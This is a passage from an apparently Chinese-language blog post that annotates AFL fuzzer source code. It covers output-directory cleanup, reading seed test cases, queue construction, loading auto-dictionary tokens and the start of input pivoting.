!= ENOENT)</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理队列目录中的测试用例 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理&lt;out_dir&gt;/crashes/id:*和&lt;out_dir&gt;/hangs/id:* */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_place_resume) &#123;</span><br><span class="line">    <span class="comment">/* 删除crashes目录中的README文件 */</span></span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/crashes/README.txt&quot;</span>, out_dir);</span><br><span class="line">    unlink(fn); <span class="comment">/* Ignore errors */</span></span><br><span class="line">    ck_free(fn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/crashes&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果进行原地恢复且crashes目录非空，则备份该目录 */</span></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume &amp;&amp; rmdir(fn)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">time_t</span> <span class="keyword">cur_t</span> = time(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">t</span> =</span> localtime(&amp;<span class="keyword">cur_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line">    <span class="comment">/* 使用时间戳创建备份目录名（格式：原名.YYYY-MM-DD-HH:MM:SS） */</span></span><br><span class="line">    u8 *nfn = alloc_printf(<span class="string">&quot;%s.%04u-%02u-%02u-%02u:%02u:%02u&quot;</span>, fn,</span><br><span class="line">                           t-&gt;tm_year + <span class="number">1900</span>, t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday,</span><br><span class="line">                           t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* 简单文件系统使用下划线格式 */</span></span><br><span class="line">    u8 *nfn = alloc_printf(<span class="string">&quot;%s_%04u%02u%02u%02u%02u%02u&quot;</span>, fn, t-&gt;tm_year + <span class="number">1900</span>,</span><br><span class="line">                           t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min,</span><br><span class="line">                           t-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^!SIMPLE_FILES */</span></span></span><br><span class="line"></span><br><span class="line">    rename(fn, nfn); <span class="comment">/* 重命名为备份（忽略错误） */</span></span><br><span class="line">    ck_free(nfn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除crashes目录中的文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理hangs目录，同样进行备份 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/hangs&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume &amp;&amp; rmdir(fn)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">time_t</span> <span class="keyword">cur_t</span> = time(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">t</span> =</span> localtime(&amp;<span class="keyword">cur_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line"></span><br><span class="line">    u8 *nfn = alloc_printf(<span class="string">&quot;%s.%04u-%02u-%02u-%02u:%02u:%02u&quot;</span>, fn,</span><br><span class="line">                           t-&gt;tm_year + <span class="number">1900</span>, t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday,</span><br><span class="line">                           t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    u8 *nfn = alloc_printf(<span class="string">&quot;%s_%04u%02u%02u%02u%02u%02u&quot;</span>, fn, t-&gt;tm_year + <span class="number">1900</span>,</span><br><span class="line">                           t-&gt;tm_mon + <span class="number">1</span>, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min,</span><br><span class="line">                           t-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^!SIMPLE_FILES */</span></span></span><br><span class="line"></span><br><span class="line">    rename(fn, nfn); <span class="comment">/* 重命名为备份（忽略错误） */</span></span><br><span class="line">    ck_free(nfn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除hangs目录中的文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (delete_files(fn, CASE_PREFIX))</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最后的清理工作 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除当前输入文件 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (unlink(fn) &amp;&amp; errno != ENOENT)</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除模糊测试位图 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/fuzz_bitmap&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (unlink(fn) &amp;&amp; errno != ENOENT)</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果不是恢复模式，删除统计文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (!in_place_resume) &#123;</span><br><span class="line">    fn = alloc_printf(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">    <span class="keyword">if</span> (unlink(fn) &amp;&amp; errno != ENOENT)</span><br><span class="line">      <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">    ck_free(fn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 删除绘图数据文件 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/plot_data&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">if</span> (unlink(fn) &amp;&amp; errno != ENOENT)</span><br><span class="line">    <span class="keyword">goto</span> dir_cleanup_failed;</span><br><span class="line">  ck_free(fn);</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;Output dir cleanup successful.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理成功，返回 */</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">dir_cleanup_failed:</span><br><span class="line">  <span class="comment">/* 清理失败的错误处理 */</span></span><br><span class="line">  SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Whoops, the fuzzer tried to reuse your output &quot;</span></span><br><span class="line">       <span class="string">&quot;directory, but bumped into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    some files that shouldn&#x27;t be there or that couldn&#x27;t be removed - &quot;</span></span><br><span class="line">       <span class="string">&quot;so it\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    decided to abort! This happened while processing this path:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;    %s\n\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    Please examine and manually delete the files, or specify a &quot;</span></span><br><span class="line">       <span class="string">&quot;different\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    output location for the tool.\n&quot;</span>,</span><br><span class="line">       fn);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Output directory cleanup failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里maybe_delete_out_dir先检查目录是否被其他AFL实例锁定，再检查上次这个文件夹是否有运行超过10分钟的会话，如果有且没有启动恢复模式则清楚所有文件如下：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250910201226916.png"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250910201549372.png"></p><p>如果超过十分钟会报错，但是如果启用恢复模式处理则将旧队列重命名为<code>_resume</code>目录供后续导入</p><p>接下来是</p><h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 读取初始测试用例 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_testcases</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> **<span class="title">nl</span>;</span>     <span class="comment">/* 目录项数组 */</span></span><br><span class="line">  s32 nl_cnt;            <span class="comment">/* 目录项计数 */</span></span><br><span class="line">  u32 i;</span><br><span class="line">  u8 *fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 自动检测非原地恢复尝试</span></span><br><span class="line"><span class="comment">     如果输入目录下有queue子目录，说明用户可能错误地将输出目录作为输入目录 */</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="keyword">if</span> (!access(fn, F_OK))    <span class="comment">/* 检查queue目录是否存在 */</span></span><br><span class="line">    in_dir = fn;            <span class="comment">/* 如果存在，将输入目录更新为queue目录 */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ck_free(fn);</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用scandir() + alphasort()而不是readdir()</span></span><br><span class="line"><span class="comment">     因为这样可以保证测试用例的顺序是确定的（按字母排序），</span></span><br><span class="line"><span class="comment">     否则顺序会有些随机，难以控制 */</span></span><br><span class="line">  nl_cnt = scandir(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* 如果目录不存在或不是目录，给出友好的错误提示 */</span></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;The input directory does not seem to be &quot;</span></span><br><span class="line">           <span class="string">&quot;valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file &quot;</span></span><br><span class="line">           <span class="string">&quot;under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in &quot;</span></span><br><span class="line">           <span class="string">&quot;the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果启用了队列打乱功能，随机打乱测试用例顺序</span></span><br><span class="line"><span class="comment">     这有助于在并行模糊测试时获得更好的覆盖率 */</span></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    ACTF(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    shuffle_ptrs((<span class="keyword">void</span> **)nl, nl_cnt);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历所有目录项 */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 构建完整文件路径 */</span></span><br><span class="line">    u8 *fn = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 构建确定性测试完成标记文件路径 */</span></span><br><span class="line">    u8 *dfn =</span><br><span class="line">        alloc_printf(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    </span><br><span class="line">    u8 passed_det = <span class="number">0</span>;  <span class="comment">/* 是否已完成确定性测试的标志 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* 释放目录项内存（不被跟踪） */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查文件状态和读权限 */</span></span><br><span class="line">    <span class="keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 跳过非常规文件、空文件、&quot;.&quot;、&quot;..&quot;以及README.txt</span></span><br><span class="line"><span class="comment">       这些都不是有效的测试用例 */</span></span><br><span class="line">    <span class="keyword">if</span> (!S_ISREG(st.st_mode) ||     <span class="comment">/* 不是常规文件 */</span></span><br><span class="line">        !st.st_size ||               <span class="comment">/* 文件大小为0 */</span></span><br><span class="line">        <span class="built_in">strstr</span>((<span class="keyword">char</span> *)fn, <span class="string">&quot;/README.txt&quot;</span>)) &#123;  <span class="comment">/* README文件 */</span></span><br><span class="line">      ck_free(fn);</span><br><span class="line">      ck_free(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查文件大小是否超过限制（默认1MB） */</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE)</span><br><span class="line">      FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn, DMS(st.st_size),</span><br><span class="line">            DMS(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查是否存在元数据文件，表明此测试用例已完成确定性模糊测试</span></span><br><span class="line"><span class="comment">       在恢复中断的扫描时，我们不想重复确定性模糊测试，</span></span><br><span class="line"><span class="comment">       因为这将是无意义且非常耗时的 */</span></span><br><span class="line">    <span class="keyword">if</span> (!access(dfn, F_OK))</span><br><span class="line">      passed_det = <span class="number">1</span>;    <span class="comment">/* 标记为已完成确定性测试 */</span></span><br><span class="line">    </span><br><span class="line">    ck_free(dfn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将测试用例添加到队列 */</span></span><br><span class="line">    add_to_queue(fn, st.st_size, passed_det);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* 释放目录项数组（不被跟踪） */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果没有有效的测试用例，给出详细错误信息并退出 */</span></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Looks like there are no valid test cases in &quot;</span></span><br><span class="line">         <span class="string">&quot;the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small &quot;</span></span><br><span class="line">         <span class="string">&quot;file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly &quot;</span></span><br><span class="line">         <span class="string">&quot;in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化时间戳 */</span></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 记录启动时的队列大小 */</span></span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能大致如下：</p><p>设置要检测的文件的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 检查输入目录配置</span><br><span class="line">   ↓</span><br><span class="line">2. 扫描目录获取文件列表</span><br><span class="line">   ↓</span><br><span class="line">3. 可选：随机打乱顺序</span><br><span class="line">   ↓</span><br><span class="line">4. 遍历每个文件：</span><br><span class="line">   - 验证文件属性</span><br><span class="line">   - 检查大小限制</span><br><span class="line">   - 检查恢复标记</span><br><span class="line">   - 添加到队列</span><br><span class="line">   ↓</span><br><span class="line">5. 验证至少有一个有效测试用例</span><br><span class="line">   ↓</span><br><span class="line">6. 记录初始队列大小</span><br></pre></td></tr></table></figure><p>主要是将符合的样例加入到队列中，并记录队列大小</p><p>这里还调用了add_to_queue，这个函数后面还会出现，</p><h2 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_to_queue</span><span class="params">(u8 *fname, u32 len, u8 passed_det)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 为新的队列条目分配内存 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span> =</span> ck_alloc(<span class="keyword">sizeof</span>(struct queue_entry));</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 初始化队列条目的基本信息 */</span></span><br><span class="line">  q-&gt;fname = fname;           <span class="comment">// 测试用例的文件名/路径</span></span><br><span class="line">  q-&gt;len = len;              <span class="comment">// 测试用例的文件大小（字节）</span></span><br><span class="line">  q-&gt;depth = cur_depth + <span class="number">1</span>;  <span class="comment">// 变异深度（当前深度+1，表示继承关系）</span></span><br><span class="line">  q-&gt;passed_det = passed_det; <span class="comment">// 是否已完成确定性变异阶段的标记</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 更新全局最大深度记录 */</span></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;depth &gt; max_depth)</span><br><span class="line">    max_depth = q-&gt;depth;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 将新条目添加到队列末尾 */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_top) &#123;</span><br><span class="line">    <span class="comment">// 队列非空：添加到末尾</span></span><br><span class="line">    queue_top-&gt;next = q;     <span class="comment">// 原队尾的next指向新节点</span></span><br><span class="line">    queue_top = q;           <span class="comment">// 更新队尾指针</span></span><br><span class="line">    </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 队列为空：这是第一个元素</span></span><br><span class="line">    q_prev100 = <span class="built_in">queue</span> = queue_top = q;  </span><br><span class="line">    <span class="comment">// q_prev100: 最近的第100倍数索引节点（用于快速跳转）</span></span><br><span class="line">    <span class="comment">// queue: 队列头指针</span></span><br><span class="line">    <span class="comment">// queue_top: 队列尾指针</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 更新全局统计信息 */</span></span><br><span class="line">  queued_paths++;         <span class="comment">// 队列中的总路径数+1</span></span><br><span class="line">  pending_not_fuzzed++;   <span class="comment">// 待模糊测试的用例数+1</span></span><br><span class="line">  cycles_wo_finds = <span class="number">0</span>;    <span class="comment">// 重置&quot;未发现新路径的循环次数&quot;计数器</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 优化：每100个元素设置一个快速跳转指针</span></span><br><span class="line"><span class="comment">   * 这创建了一个&quot;快速通道&quot;链表，可以每次跳过100个元素</span></span><br><span class="line"><span class="comment">   * 用于加速大队列的遍历 */</span></span><br><span class="line">  <span class="keyword">if</span> ((queued_paths - <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span> &amp;&amp; queued_paths &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 当前是第100、200、300...个元素（索引99、199、299...）</span></span><br><span class="line">    q_prev100-&gt;next_100 = q;  <span class="comment">// 上一个百位节点指向当前节点</span></span><br><span class="line">    q_prev100 = q;            <span class="comment">// 更新最近的百位节点指针</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 记录最后一次添加路径的时间戳 */</span></span><br><span class="line">  last_path_time = get_cur_time();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将所有的初试化待测测试样例加入到队列</p><h2 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h2><p>这里是加载字典文件，我本地没有字典文件，这里简单注释一下maybe_add_auto</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 加载自动发现的字典token */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load_auto</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u32 i;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 遍历所有可能的自动字典文件</span></span><br><span class="line"><span class="comment">     USE_AUTO_EXTRAS 定义了最大数量（通常是50-200个） */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; USE_AUTO_EXTRAS; i++) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 临时缓冲区，多分配1字节用于检测过长的token */</span></span><br><span class="line">    u8 tmp[MAX_AUTO_EXTRA + <span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 构建自动字典文件路径</span></span><br><span class="line"><span class="comment">       格式: input_dir/.state/auto_extras/auto_000000, auto_000001... */</span></span><br><span class="line">    u8 *fn = alloc_printf(<span class="string">&quot;%s/.state/auto_extras/auto_%06u&quot;</span>, in_dir, i);</span><br><span class="line">    </span><br><span class="line">    s32 fd, len;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 打开字典文件（只读） */</span></span><br><span class="line">    fd = open(fn, O_RDONLY, <span class="number">0600</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/* 如果文件不存在（ENOENT），说明已经读完所有字典文件，正常退出循环 */</span></span><br><span class="line">      <span class="keyword">if</span> (errno != ENOENT)</span><br><span class="line">        PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">/* 其他错误则报错退出 */</span></span><br><span class="line">      </span><br><span class="line">      ck_free(fn);</span><br><span class="line">      <span class="keyword">break</span>;  <span class="comment">/* 跳出循环 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 读取token内容</span></span><br><span class="line"><span class="comment">       故意多读一个字节来检测token是否过长</span></span><br><span class="line"><span class="comment">       如果读取的长度超过MAX_AUTO_EXTRA，说明token太长，将被跳过 */</span></span><br><span class="line">    len = read(fd, tmp, MAX_AUTO_EXTRA + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to read from &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 只有当token长度在合理范围内才添加到字典</span></span><br><span class="line"><span class="comment">       MIN_AUTO_EXTRA: 最小长度（通常3字节）</span></span><br><span class="line"><span class="comment">       MAX_AUTO_EXTRA: 最大长度（通常32字节） */</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= MIN_AUTO_EXTRA &amp;&amp; len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      maybe_add_auto(tmp, len);  <span class="comment">/* 尝试添加到字典（会去重） */</span></span><br><span class="line">    </span><br><span class="line">    close(fd);</span><br><span class="line">    ck_free(fn);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 输出加载结果 */</span></span><br><span class="line">  <span class="keyword">if</span> (i)</span><br><span class="line">    OKF(<span class="string">&quot;Loaded %u auto-discovered dictionary tokens.&quot;</span>, i);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    OKF(<span class="string">&quot;No auto-generated dictionary tokens to reuse.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h2><p>为这里首先是遍历之前add_to_queue设置的队列，如果文件名已经<strong>符合AFL格式且ID匹配</strong>，说明是从中断的模糊测试恢复，会保留原有信息，通过解析文件名中的父ID信息，建立测试用例的继承关系树，记录每个测试用例的深度，如果不是恢复之前的工作就设置格式化的文件名。然后在新的路径建立一个硬链接或者复制一个备份，以便保护源文件的命名，不去修改，而是新建一个。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pivot_inputs</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span> =</span> <span class="built_in">queue</span>;  <span class="comment">// 指向输入队列的头部</span></span><br><span class="line">  u32 id = <span class="number">0</span>;                     <span class="comment">// 用于给输入文件分配唯一ID</span></span><br><span class="line">  </span><br><span class="line">  ACTF(<span class="string">&quot;Creating hard links for all input files...&quot;</span>);  <span class="comment">// 打印活动日志</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 遍历整个输入队列</span></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    u8 *nfn, *rsl = <span class="built_in">strrchr</span>((<span class="keyword">char</span> *)q-&gt;fname, <span class="string">&#x27;/&#x27;</span>);  <span class="comment">// 找到文件名中最后一个&#x27;/&#x27;</span></span><br><span class="line">    u32 orig_id;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提取文件的基本名称（去掉路径部分）</span></span><br><span class="line">    <span class="keyword">if</span> (!rsl)</span><br><span class="line">      rsl = q-&gt;fname;  <span class="comment">// 如果没有&#x27;/&#x27;，整个字符串就是文件名</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      rsl++;          <span class="comment">// 跳过&#x27;/&#x27;字符，指向实际文件名</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 检查原始文件名是否符合AFL的命名规范</span></span><br><span class="line"><span class="comment">       如果符合且ID匹配，则复用原文件名（用于恢复中断的模糊测试） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIMPLE_FILES</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CASE_PREFIX <span class="meta-string">&quot;id:&quot;</span>    <span class="comment">// 正常模式：文件名前缀为 &quot;id:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CASE_PREFIX <span class="meta-string">&quot;id_&quot;</span>    <span class="comment">// 简单模式：文件名前缀为 &quot;id_&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查文件名是否以 &quot;id:XXXXXX&quot; 格式开头</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(rsl, CASE_PREFIX, <span class="number">3</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">sscanf</span>(rsl + <span class="number">3</span>, <span class="string">&quot;%06u&quot;</span>, &amp;orig_id) == <span class="number">1</span> &amp;&amp; orig_id == id) &#123;</span><br><span class="line">      </span><br><span class="line">      u8 *src_str;</span><br><span class="line">      u32 src_id;</span><br><span class="line">      </span><br><span class="line">      resuming_fuzz = <span class="number">1</span>;  <span class="comment">// 标记为恢复模式</span></span><br><span class="line">      nfn = alloc_printf(<span class="string">&quot;%s/queue/%s&quot;</span>, out_dir, rsl);  <span class="comment">// 构造新文件路径</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* 尝试解析父测试用例ID，确定测试深度</span></span><br><span class="line"><span class="comment">         文件名格式可能是: id:000001:000000 (当前ID:父ID) */</span></span><br><span class="line">      src_str = <span class="built_in">strchr</span>((<span class="keyword">char</span> *)rsl + <span class="number">3</span>, <span class="string">&#x27;:&#x27;</span>);</span><br><span 